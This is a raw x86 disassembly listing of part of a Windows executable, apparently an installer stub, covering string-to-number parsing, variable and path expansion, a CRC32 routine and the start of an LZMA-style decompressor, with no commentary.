  406516:	41                   	inc    %ecx
  406517:	41                   	inc    %ecx
  406518:	66 8b 11             	mov    (%ecx),%dx
  40651b:	66 83 fa 30          	cmp    $0x30,%dx
  40651f:	72 0c                	jb     0x40652d
  406521:	66 83 fa 37          	cmp    $0x37,%dx
  406525:	77 06                	ja     0x40652d
  406527:	6a 08                	push   $0x8
  406529:	58                   	pop    %eax
  40652a:	6a 37                	push   $0x37
  40652c:	5b                   	pop    %ebx
  40652d:	0f b7 d2             	movzwl %dx,%edx
  406530:	83 e2 df             	and    $0xffffffdf,%edx
  406533:	83 fa 58             	cmp    $0x58,%edx
  406536:	75 05                	jne    0x40653d
  406538:	6a 10                	push   $0x10
  40653a:	41                   	inc    %ecx
  40653b:	58                   	pop    %eax
  40653c:	41                   	inc    %ecx
  40653d:	0f b7 11             	movzwl (%ecx),%edx
  406540:	41                   	inc    %ecx
  406541:	41                   	inc    %ecx
  406542:	83 fa 30             	cmp    $0x30,%edx
  406545:	7c 0c                	jl     0x406553
  406547:	0f b7 f3             	movzwl %bx,%esi
  40654a:	3b d6                	cmp    %esi,%edx
  40654c:	7f 05                	jg     0x406553
  40654e:	83 ea 30             	sub    $0x30,%edx
  406551:	eb 1b                	jmp    0x40656e
  406553:	66 3d 10 00          	cmp    $0x10,%ax
  406557:	75 23                	jne    0x40657c
  406559:	8b f2                	mov    %edx,%esi
  40655b:	83 e6 df             	and    $0xffffffdf,%esi
  40655e:	83 fe 41             	cmp    $0x41,%esi
  406561:	7c 19                	jl     0x40657c
  406563:	83 fe 46             	cmp    $0x46,%esi
  406566:	7f 14                	jg     0x40657c
  406568:	83 e2 07             	and    $0x7,%edx
  40656b:	83 c2 09             	add    $0x9,%edx
  40656e:	0f b7 f0             	movzwl %ax,%esi
  406571:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  406575:	03 f2                	add    %edx,%esi
  406577:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40657a:	eb c1                	jmp    0x40653d
  40657c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40657f:	5e                   	pop    %esi
  406580:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  406584:	5b                   	pop    %ebx
  406585:	c9                   	leave
  406586:	c2 04 00             	ret    $0x4
  406589:	68 00 04 00 00       	push   $0x400
  40658e:	ff 74 24 0c          	push   0xc(%esp)
  406592:	ff 74 24 0c          	push   0xc(%esp)
  406596:	ff 15 98 80 40 00    	call   *0x408098
  40659c:	c2 08 00             	ret    $0x8
  40659f:	ff 25 9c 80 40 00    	jmp    *0x40809c
  4065a5:	ff 25 54 81 40 00    	jmp    *0x408154
  4065ab:	33 c0                	xor    %eax,%eax
  4065ad:	50                   	push   %eax
  4065ae:	50                   	push   %eax
  4065af:	ff 74 24 14          	push   0x14(%esp)
  4065b3:	ff 74 24 14          	push   0x14(%esp)
  4065b7:	6a ff                	push   $0xffffffff
  4065b9:	ff 74 24 18          	push   0x18(%esp)
  4065bd:	50                   	push   %eax
  4065be:	50                   	push   %eax
  4065bf:	ff 15 94 80 40 00    	call   *0x408094
  4065c5:	c3                   	ret
  4065c6:	8b 44 24 08          	mov    0x8(%esp),%eax
  4065ca:	83 ec 10             	sub    $0x10,%esp
  4065cd:	85 c0                	test   %eax,%eax
  4065cf:	7d 11                	jge    0x4065e2
  4065d1:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  4065d7:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4065de:	2b c8                	sub    %eax,%ecx
  4065e0:	8b 01                	mov    (%ecx),%eax
  4065e2:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  4065e8:	53                   	push   %ebx
  4065e9:	55                   	push   %ebp
  4065ea:	56                   	push   %esi
  4065eb:	57                   	push   %edi
  4065ec:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  4065ef:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4065f3:	b8 c0 79 42 00       	mov    $0x4279c0,%eax
  4065f8:	3b c8                	cmp    %eax,%ecx
  4065fa:	8b f0                	mov    %eax,%esi
  4065fc:	0f 82 0a 02 00 00    	jb     0x40680c
  406602:	8b d1                	mov    %ecx,%edx
  406604:	2b d0                	sub    %eax,%edx
  406606:	d1 fa                	sar    $1,%edx
  406608:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  40660e:	0f 83 f8 01 00 00    	jae    0x40680c
  406614:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  406619:	8b f1                	mov    %ecx,%esi
  40661b:	e9 ec 01 00 00       	jmp    0x40680c
  406620:	8b ce                	mov    %esi,%ecx
  406622:	2b c8                	sub    %eax,%ecx
  406624:	83 e1 fe             	and    $0xfffffffe,%ecx
  406627:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40662d:	0f 8d e5 01 00 00    	jge    0x406818
  406633:	6a 02                	push   $0x2
  406635:	59                   	pop    %ecx
  406636:	03 f9                	add    %ecx,%edi
  406638:	66 83 fd 04          	cmp    $0x4,%bp
  40663c:	0f 83 b7 01 00 00    	jae    0x4067f9
  406642:	8a 4f 01             	mov    0x1(%edi),%cl
  406645:	8a 07                	mov    (%edi),%al
  406647:	8a d1                	mov    %cl,%dl
  406649:	8a d8                	mov    %al,%bl
  40664b:	83 e2 7f             	and    $0x7f,%edx
  40664e:	83 e3 7f             	and    $0x7f,%ebx
  406651:	c1 e2 07             	shl    $0x7,%edx
  406654:	0f b6 c0             	movzbl %al,%eax
  406657:	0b d3                	or     %ebx,%edx
  406659:	8b d8                	mov    %eax,%ebx
  40665b:	89 54 24 28          	mov    %edx,0x28(%esp)
  40665f:	ba 00 80 00 00       	mov    $0x8000,%edx
  406664:	0b da                	or     %edx,%ebx
  406666:	6a 02                	push   $0x2
  406668:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40666c:	89 44 24 18          	mov    %eax,0x18(%esp)
  406670:	0f b6 d9             	movzbl %cl,%ebx
  406673:	8b cb                	mov    %ebx,%ecx
  406675:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  406679:	0b ca                	or     %edx,%ecx
  40667b:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  40667f:	59                   	pop    %ecx
  406680:	03 f9                	add    %ecx,%edi
  406682:	66 3b e9             	cmp    %cx,%bp
  406685:	0f 85 12 01 00 00    	jne    0x40679d
  40668b:	33 ed                	xor    %ebp,%ebp
  40668d:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  406691:	39 2d a4 9a 42 00    	cmp    %ebp,0x429aa4
  406697:	74 08                	je     0x4066a1
  406699:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  4066a0:	00 
  4066a1:	84 c0                	test   %al,%al
  4066a3:	79 38                	jns    0x4066dd
  4066a5:	8b c8                	mov    %eax,%ecx
  4066a7:	83 e0 3f             	and    $0x3f,%eax
  4066aa:	83 e1 40             	and    $0x40,%ecx
  4066ad:	51                   	push   %ecx
  4066ae:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  4066b4:	56                   	push   %esi
  4066b5:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4066b8:	50                   	push   %eax
  4066b9:	68 20 84 40 00       	push   $0x408420
  4066be:	68 02 00 00 80       	push   $0x80000002
  4066c3:	e8 8f fd ff ff       	call   0x406457
  4066c8:	66 39 2e             	cmp    %bp,(%esi)
  4066cb:	0f 85 b4 00 00 00    	jne    0x406785
  4066d1:	53                   	push   %ebx
  4066d2:	56                   	push   %esi
  4066d3:	e8 ee fe ff ff       	call   0x4065c6
  4066d8:	e9 a3 00 00 00       	jmp    0x406780
  4066dd:	83 f8 25             	cmp    $0x25,%eax
  4066e0:	75 11                	jne    0x4066f3
  4066e2:	68 00 04 00 00       	push   $0x400
  4066e7:	56                   	push   %esi
  4066e8:	ff 15 58 81 40 00    	call   *0x408158
  4066ee:	e9 8d 00 00 00       	jmp    0x406780
  4066f3:	83 f8 24             	cmp    $0x24,%eax
  4066f6:	75 10                	jne    0x406708
  4066f8:	68 00 04 00 00       	push   $0x400
  4066fd:	56                   	push   %esi
  4066fe:	ff 15 b0 80 40 00    	call   *0x4080b0
  406704:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  406708:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  40670c:	74 72                	je     0x406780
  40670e:	ff 4c 24 28          	decl   0x28(%esp)
  406712:	8b 44 24 28          	mov    0x28(%esp),%eax
  406716:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  40671a:	a1 24 9a 42 00       	mov    0x429a24,%eax
  40671f:	83 e3 bf             	and    $0xffffffbf,%ebx
  406722:	8b eb                	mov    %ebx,%ebp
  406724:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  40672a:	85 c0                	test   %eax,%eax
  40672c:	74 12                	je     0x406740
  40672e:	56                   	push   %esi
  40672f:	6a 00                	push   $0x0
  406731:	6a 00                	push   $0x0
  406733:	53                   	push   %ebx
  406734:	ff 35 28 9a 42 00    	push   0x429a28
  40673a:	ff d0                	call   *%eax
  40673c:	85 c0                	test   %eax,%eax
  40673e:	74 3a                	je     0x40677a
  406740:	6a 07                	push   $0x7
  406742:	e8 36 02 00 00       	call   0x40697d
  406747:	0f b6 cb             	movzbl %bl,%ecx
  40674a:	55                   	push   %ebp
  40674b:	51                   	push   %ecx
  40674c:	ff 35 28 9a 42 00    	push   0x429a28
  406752:	ff d0                	call   *%eax
  406754:	8b d8                	mov    %eax,%ebx
  406756:	85 db                	test   %ebx,%ebx
  406758:	74 15                	je     0x40676f
  40675a:	56                   	push   %esi
  40675b:	53                   	push   %ebx
  40675c:	ff 15 74 81 40 00    	call   *0x408174
  406762:	53                   	push   %ebx
  406763:	8b e8                	mov    %eax,%ebp
  406765:	ff 15 a0 82 40 00    	call   *0x4082a0
  40676b:	85 ed                	test   %ebp,%ebp
  40676d:	75 0b                	jne    0x40677a
  40676f:	66 83 26 00          	andw   $0x0,(%esi)
  406773:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  406778:	75 94                	jne    0x40670e
  40677a:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40677e:	33 ed                	xor    %ebp,%ebp
  406780:	66 39 2e             	cmp    %bp,(%esi)
  406783:	74 10                	je     0x406795
  406785:	83 fb 1a             	cmp    $0x1a,%ebx
  406788:	75 0b                	jne    0x406795
  40678a:	68 78 84 40 00       	push   $0x408478
  40678f:	56                   	push   %esi
  406790:	e8 10 fe ff ff       	call   0x4065a5
  406795:	56                   	push   %esi
  406796:	e8 9c 00 00 00       	call   0x406837
  40679b:	eb 4c                	jmp    0x4067e9
  40679d:	66 83 fd 03          	cmp    $0x3,%bp
  4067a1:	75 32                	jne    0x4067d5
  4067a3:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4067a7:	83 fb 1d             	cmp    $0x1d,%ebx
  4067aa:	75 0e                	jne    0x4067ba
  4067ac:	ff 35 28 9a 42 00    	push   0x429a28
  4067b2:	56                   	push   %esi
  4067b3:	e8 18 fd ff ff       	call   0x4064d0
  4067b8:	eb 11                	jmp    0x4067cb
  4067ba:	8b c3                	mov    %ebx,%eax
  4067bc:	c1 e0 0b             	shl    $0xb,%eax
  4067bf:	05 00 a0 42 00       	add    $0x42a000,%eax
  4067c4:	50                   	push   %eax
  4067c5:	56                   	push   %esi
  4067c6:	e8 be fd ff ff       	call   0x406589
  4067cb:	83 c3 eb             	add    $0xffffffeb,%ebx
  4067ce:	83 fb 07             	cmp    $0x7,%ebx
  4067d1:	73 16                	jae    0x4067e9
  4067d3:	eb c0                	jmp    0x406795
  4067d5:	66 83 fd 01          	cmp    $0x1,%bp
  4067d9:	75 0e                	jne    0x4067e9
  4067db:	83 c8 ff             	or     $0xffffffff,%eax
  4067de:	2b 44 24 28          	sub    0x28(%esp),%eax
  4067e2:	50                   	push   %eax
  4067e3:	56                   	push   %esi
  4067e4:	e8 dd fd ff ff       	call   0x4065c6
  4067e9:	56                   	push   %esi
  4067ea:	e8 b0 fd ff ff       	call   0x40659f
  4067ef:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4067f2:	b8 c0 79 42 00       	mov    $0x4279c0,%eax
  4067f7:	eb 13                	jmp    0x40680c
  4067f9:	75 0c                	jne    0x406807
  4067fb:	66 8b 17             	mov    (%edi),%dx
  4067fe:	66 89 16             	mov    %dx,(%esi)
  406801:	03 f1                	add    %ecx,%esi
  406803:	03 f9                	add    %ecx,%edi
  406805:	eb 05                	jmp    0x40680c
  406807:	66 89 2e             	mov    %bp,(%esi)
  40680a:	03 f1                	add    %ecx,%esi
  40680c:	66 8b 2f             	mov    (%edi),%bp
  40680f:	66 85 ed             	test   %bp,%bp
  406812:	0f 85 08 fe ff ff    	jne    0x406620
  406818:	66 83 26 00          	andw   $0x0,(%esi)
  40681c:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  406821:	5f                   	pop    %edi
  406822:	5e                   	pop    %esi
  406823:	5d                   	pop    %ebp
  406824:	5b                   	pop    %ebx
  406825:	74 0a                	je     0x406831
  406827:	50                   	push   %eax
  406828:	ff 74 24 18          	push   0x18(%esp)
  40682c:	e8 58 fd ff ff       	call   0x406589
  406831:	83 c4 10             	add    $0x10,%esp
  406834:	c2 08 00             	ret    $0x8
  406837:	55                   	push   %ebp
  406838:	56                   	push   %esi
  406839:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40683d:	57                   	push   %edi
  40683e:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406842:	75 18                	jne    0x40685c
  406844:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  406849:	75 11                	jne    0x40685c
  40684b:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406850:	75 0a                	jne    0x40685c
  406852:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  406857:	75 03                	jne    0x40685c
  406859:	83 c6 08             	add    $0x8,%esi
  40685c:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406860:	74 0d                	je     0x40686f
  406862:	56                   	push   %esi
  406863:	e8 67 f6 ff ff       	call   0x405ecf
  406868:	85 c0                	test   %eax,%eax
  40686a:	74 03                	je     0x40686f
  40686c:	83 c6 04             	add    $0x4,%esi
  40686f:	66 8b 06             	mov    (%esi),%ax
  406872:	8b ee                	mov    %esi,%ebp
  406874:	66 85 c0             	test   %ax,%ax
  406877:	8b fe                	mov    %esi,%edi
  406879:	74 40                	je     0x4068bb
  40687b:	53                   	push   %ebx
  40687c:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  406882:	66 3d 1f 00          	cmp    $0x1f,%ax
  406886:	76 25                	jbe    0x4068ad
  406888:	50                   	push   %eax
  406889:	68 9c a5 40 00       	push   $0x40a59c
  40688e:	e8 f2 f5 ff ff       	call   0x405e85
  406893:	66 83 38 00          	cmpw   $0x0,(%eax)
  406897:	75 14                	jne    0x4068ad
  406899:	56                   	push   %esi
  40689a:	ff d3                	call   *%ebx
  40689c:	2b c6                	sub    %esi,%eax
  40689e:	d1 f8                	sar    $1,%eax
  4068a0:	50                   	push   %eax
  4068a1:	56                   	push   %esi
  4068a2:	57                   	push   %edi
  4068a3:	e8 8c f7 ff ff       	call   0x406034
  4068a8:	57                   	push   %edi
  4068a9:	ff d3                	call   *%ebx
  4068ab:	8b f8                	mov    %eax,%edi
  4068ad:	56                   	push   %esi
  4068ae:	ff d3                	call   *%ebx
  4068b0:	8b f0                	mov    %eax,%esi
  4068b2:	66 8b 06             	mov    (%esi),%ax
  4068b5:	66 85 c0             	test   %ax,%ax
  4068b8:	75 c8                	jne    0x406882
  4068ba:	5b                   	pop    %ebx
  4068bb:	66 83 27 00          	andw   $0x0,(%edi)
  4068bf:	57                   	push   %edi
  4068c0:	55                   	push   %ebp
  4068c1:	ff 15 fc 81 40 00    	call   *0x4081fc
  4068c7:	8b f8                	mov    %eax,%edi
  4068c9:	66 8b 07             	mov    (%edi),%ax
  4068cc:	66 3d 20 00          	cmp    $0x20,%ax
  4068d0:	74 06                	je     0x4068d8
  4068d2:	66 3d 5c 00          	cmp    $0x5c,%ax
  4068d6:	75 08                	jne    0x4068e0
  4068d8:	66 83 27 00          	andw   $0x0,(%edi)
  4068dc:	3b ef                	cmp    %edi,%ebp
  4068de:	72 df                	jb     0x4068bf
  4068e0:	5f                   	pop    %edi
  4068e1:	5e                   	pop    %esi
  4068e2:	5d                   	pop    %ebp
  4068e3:	c2 04 00             	ret    $0x4
  4068e6:	56                   	push   %esi
  4068e7:	be 58 5f 42 00       	mov    $0x425f58,%esi
  4068ec:	56                   	push   %esi
  4068ed:	ff 74 24 0c          	push   0xc(%esp)
  4068f1:	ff 15 40 81 40 00    	call   *0x408140
  4068f7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068fa:	74 0b                	je     0x406907
  4068fc:	50                   	push   %eax
  4068fd:	ff 15 38 81 40 00    	call   *0x408138
  406903:	8b c6                	mov    %esi,%eax
  406905:	eb 02                	jmp    0x406909
  406907:	33 c0                	xor    %eax,%eax
  406909:	5e                   	pop    %esi
  40690a:	c2 04 00             	ret    $0x4
  40690d:	55                   	push   %ebp
  40690e:	8b ec                	mov    %esp,%ebp
  406910:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  406916:	56                   	push   %esi
  406917:	be 04 01 00 00       	mov    $0x104,%esi
  40691c:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406922:	56                   	push   %esi
  406923:	50                   	push   %eax
  406924:	ff 15 58 81 40 00    	call   *0x408158
  40692a:	3b c6                	cmp    %esi,%eax
  40692c:	5e                   	pop    %esi
  40692d:	76 02                	jbe    0x406931
  40692f:	33 c0                	xor    %eax,%eax
  406931:	85 c0                	test   %eax,%eax
  406933:	74 0f                	je     0x406944
  406935:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  40693c:	ff 5c 
  40693e:	74 04                	je     0x406944
  406940:	33 c9                	xor    %ecx,%ecx
  406942:	eb 03                	jmp    0x406947
  406944:	33 c9                	xor    %ecx,%ecx
  406946:	41                   	inc    %ecx
  406947:	ff 75 08             	push   0x8(%ebp)
  40694a:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406951:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  406958:	51                   	push   %ecx
  406959:	68 b0 a5 40 00       	push   $0x40a5b0
  40695e:	50                   	push   %eax
  40695f:	ff 15 2c 82 40 00    	call   *0x40822c
  406965:	83 c4 10             	add    $0x10,%esp
  406968:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  40696e:	6a 08                	push   $0x8
  406970:	6a 00                	push   $0x0
  406972:	50                   	push   %eax
  406973:	ff 15 18 81 40 00    	call   *0x408118
  406979:	c9                   	leave
  40697a:	c2 04 00             	ret    $0x4
  40697d:	8b 44 24 04          	mov    0x4(%esp),%eax
  406981:	56                   	push   %esi
  406982:	8b f0                	mov    %eax,%esi
  406984:	57                   	push   %edi
  406985:	c1 e6 03             	shl    $0x3,%esi
  406988:	8b be d8 a3 40 00    	mov    0x40a3d8(%esi),%edi
  40698e:	57                   	push   %edi
  40698f:	ff 15 60 81 40 00    	call   *0x408160
  406995:	85 c0                	test   %eax,%eax
  406997:	75 0a                	jne    0x4069a3
  406999:	57                   	push   %edi
  40699a:	e8 6e ff ff ff       	call   0x40690d
  40699f:	85 c0                	test   %eax,%eax
  4069a1:	74 0f                	je     0x4069b2
  4069a3:	ff b6 dc a3 40 00    	push   0x40a3dc(%esi)
  4069a9:	50                   	push   %eax
  4069aa:	ff 15 5c 81 40 00    	call   *0x40815c
  4069b0:	eb 02                	jmp    0x4069b4
  4069b2:	33 c0                	xor    %eax,%eax
  4069b4:	5f                   	pop    %edi
  4069b5:	5e                   	pop    %esi
  4069b6:	c2 04 00             	ret    $0x4
  4069b9:	55                   	push   %ebp
  4069ba:	8b ec                	mov    %esp,%ebp
  4069bc:	83 ec 1c             	sub    $0x1c,%esp
  4069bf:	56                   	push   %esi
  4069c0:	8b 75 08             	mov    0x8(%ebp),%esi
  4069c3:	57                   	push   %edi
  4069c4:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  4069ca:	eb 0a                	jmp    0x4069d6
  4069cc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4069cf:	50                   	push   %eax
  4069d0:	ff 15 7c 82 40 00    	call   *0x40827c
  4069d6:	6a 01                	push   $0x1
  4069d8:	56                   	push   %esi
  4069d9:	56                   	push   %esi
  4069da:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4069dd:	6a 00                	push   $0x0
  4069df:	50                   	push   %eax
  4069e0:	ff d7                	call   *%edi
  4069e2:	85 c0                	test   %eax,%eax
  4069e4:	75 e6                	jne    0x4069cc
  4069e6:	5f                   	pop    %edi
  4069e7:	5e                   	pop    %esi
  4069e8:	c9                   	leave
  4069e9:	c2 04 00             	ret    $0x4
  4069ec:	55                   	push   %ebp
  4069ed:	8b ec                	mov    %esp,%ebp
  4069ef:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4069f5:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4069fb:	68 00 01 00 00       	push   $0x100
  406a00:	50                   	push   %eax
  406a01:	ff 75 0c             	push   0xc(%ebp)
  406a04:	e8 a2 fb ff ff       	call   0x4065ab
  406a09:	83 c4 0c             	add    $0xc,%esp
  406a0c:	85 c0                	test   %eax,%eax
  406a0e:	74 12                	je     0x406a22
  406a10:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a16:	50                   	push   %eax
  406a17:	ff 75 08             	push   0x8(%ebp)
  406a1a:	ff 15 5c 81 40 00    	call   *0x40815c
  406a20:	eb 02                	jmp    0x406a24
  406a22:	33 c0                	xor    %eax,%eax
  406a24:	c9                   	leave
  406a25:	c2 08 00             	ret    $0x8
  406a28:	55                   	push   %ebp
  406a29:	8b ec                	mov    %esp,%ebp
  406a2b:	51                   	push   %ecx
  406a2c:	56                   	push   %esi
  406a2d:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406a33:	57                   	push   %edi
  406a34:	6a 64                	push   $0x64
  406a36:	ff 75 08             	push   0x8(%ebp)
  406a39:	ff d6                	call   *%esi
  406a3b:	bf 02 01 00 00       	mov    $0x102,%edi
  406a40:	eb 0e                	jmp    0x406a50
  406a42:	6a 0f                	push   $0xf
  406a44:	e8 70 ff ff ff       	call   0x4069b9
  406a49:	6a 64                	push   $0x64
  406a4b:	ff 75 08             	push   0x8(%ebp)
  406a4e:	ff d6                	call   *%esi
  406a50:	3b c7                	cmp    %edi,%eax
  406a52:	74 ee                	je     0x406a42
  406a54:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a57:	50                   	push   %eax
  406a58:	ff 75 08             	push   0x8(%ebp)
  406a5b:	ff 15 64 81 40 00    	call   *0x408164
  406a61:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a64:	5f                   	pop    %edi
  406a65:	5e                   	pop    %esi
  406a66:	c9                   	leave
  406a67:	c2 04 00             	ret    $0x4
  406a6a:	83 3d ac 75 42 00 00 	cmpl   $0x0,0x4275ac
  406a71:	56                   	push   %esi
  406a72:	75 2d                	jne    0x406aa1
  406a74:	33 c9                	xor    %ecx,%ecx
  406a76:	6a 08                	push   $0x8
  406a78:	8b c1                	mov    %ecx,%eax
  406a7a:	5e                   	pop    %esi
  406a7b:	8b d0                	mov    %eax,%edx
  406a7d:	80 e2 01             	and    $0x1,%dl
  406a80:	f6 da                	neg    %dl
  406a82:	1b d2                	sbb    %edx,%edx
  406a84:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406a8a:	d1 e8                	shr    $1,%eax
  406a8c:	33 c2                	xor    %edx,%eax
  406a8e:	4e                   	dec    %esi
  406a8f:	75 ea                	jne    0x406a7b
  406a91:	89 04 8d a8 75 42 00 	mov    %eax,0x4275a8(,%ecx,4)
  406a98:	41                   	inc    %ecx
  406a99:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406a9f:	7c d5                	jl     0x406a76
  406aa1:	8b 54 24 10          	mov    0x10(%esp),%edx
  406aa5:	8b 44 24 08          	mov    0x8(%esp),%eax
  406aa9:	85 d2                	test   %edx,%edx
  406aab:	f7 d0                	not    %eax
  406aad:	76 23                	jbe    0x406ad2
  406aaf:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406ab3:	57                   	push   %edi
  406ab4:	0f b6 39             	movzbl (%ecx),%edi
  406ab7:	8b f0                	mov    %eax,%esi
  406ab9:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406abf:	33 f7                	xor    %edi,%esi
  406ac1:	c1 e8 08             	shr    $0x8,%eax
  406ac4:	8b 34 b5 a8 75 42 00 	mov    0x4275a8(,%esi,4),%esi
  406acb:	33 c6                	xor    %esi,%eax
  406acd:	41                   	inc    %ecx
  406ace:	4a                   	dec    %edx
  406acf:	75 e3                	jne    0x406ab4
  406ad1:	5f                   	pop    %edi
  406ad2:	f7 d0                	not    %eax
  406ad4:	5e                   	pop    %esi
  406ad5:	c2 0c 00             	ret    $0xc
  406ad8:	b8 80 00 00 00       	mov    $0x80,%eax
  406add:	48                   	dec    %eax
  406ade:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406ae2:	75 f9                	jne    0x406add
  406ae4:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406ae8:	33 c0                	xor    %eax,%eax
  406aea:	40                   	inc    %eax
  406aeb:	89 41 68             	mov    %eax,0x68(%ecx)
  406aee:	89 41 64             	mov    %eax,0x64(%ecx)
  406af1:	89 41 60             	mov    %eax,0x60(%ecx)
  406af4:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406af7:	c3                   	ret
  406af8:	55                   	push   %ebp
  406af9:	8b ec                	mov    %esp,%ebp
  406afb:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406b01:	53                   	push   %ebx
  406b02:	56                   	push   %esi
  406b03:	57                   	push   %edi
  406b04:	6a 22                	push   $0x22
  406b06:	8b f1                	mov    %ecx,%esi
  406b08:	59                   	pop    %ecx
  406b09:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406b0f:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406b15:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406b17:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406b1b:	75 08                	jne    0x406b25
  406b1d:	33 c0                	xor    %eax,%eax
  406b1f:	40                   	inc    %eax
  406b20:	e9 20 0a 00 00       	jmp    0x407545
  406b25:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406b28:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406b2b:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406b31:	83 f8 1c             	cmp    $0x1c,%eax
  406b34:	0f 87 08 0a 00 00    	ja     0x407542
  406b3a:	ff 24 85 4a 75 40 00 	jmp    *0x40754a(,%eax,4)
  406b41:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b45:	0f 84 e2 09 00 00    	je     0x40752d
  406b4b:	8b 45 90             	mov    -0x70(%ebp),%eax
  406b4e:	ff 4d 94             	decl   -0x6c(%ebp)
  406b51:	ff 45 90             	incl   -0x70(%ebp)
  406b54:	8a 00                	mov    (%eax),%al
  406b56:	3c e1                	cmp    $0xe1,%al
  406b58:	0f 87 e4 09 00 00    	ja     0x407542
  406b5e:	0f b6 c0             	movzbl %al,%eax
  406b61:	6a 2d                	push   $0x2d
  406b63:	99                   	cltd
  406b64:	59                   	pop    %ecx
  406b65:	f7 f9                	idiv   %ecx
  406b67:	6a 09                	push   $0x9
  406b69:	59                   	pop    %ecx
  406b6a:	8b f0                	mov    %eax,%esi
  406b6c:	0f b6 c2             	movzbl %dl,%eax
  406b6f:	99                   	cltd
  406b70:	f7 f9                	idiv   %ecx
  406b72:	8b ce                	mov    %esi,%ecx
  406b74:	0f b6 fa             	movzbl %dl,%edi
  406b77:	33 d2                	xor    %edx,%edx
  406b79:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  406b7c:	42                   	inc    %edx
  406b7d:	d3 e2                	shl    %cl,%edx
  406b7f:	8b c8                	mov    %eax,%ecx
  406b81:	4a                   	dec    %edx
  406b82:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406b85:	33 d2                	xor    %edx,%edx
  406b87:	42                   	inc    %edx
  406b88:	d3 e2                	shl    %cl,%edx
  406b8a:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406b8d:	be 00 03 00 00       	mov    $0x300,%esi
  406b92:	d3 e6                	shl    %cl,%esi
  406b94:	4a                   	dec    %edx
  406b95:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406b98:	81 c6 36 07 00 00    	add    $0x736,%esi
  406b9e:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406ba1:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406ba4:	74 26                	je     0x406bcc
  406ba6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406baa:	74 09                	je     0x406bb5
  406bac:	ff 75 fc             	push   -0x4(%ebp)
  406baf:	ff 15 0c 81 40 00    	call   *0x40810c
  406bb5:	57                   	push   %edi
  406bb6:	6a 40                	push   $0x40
  406bb8:	ff 15 10 81 40 00    	call   *0x408110
  406bbe:	85 c0                	test   %eax,%eax
  406bc0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406bc3:	0f 84 79 09 00 00    	je     0x407542
  406bc9:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406bcc:	85 f6                	test   %esi,%esi
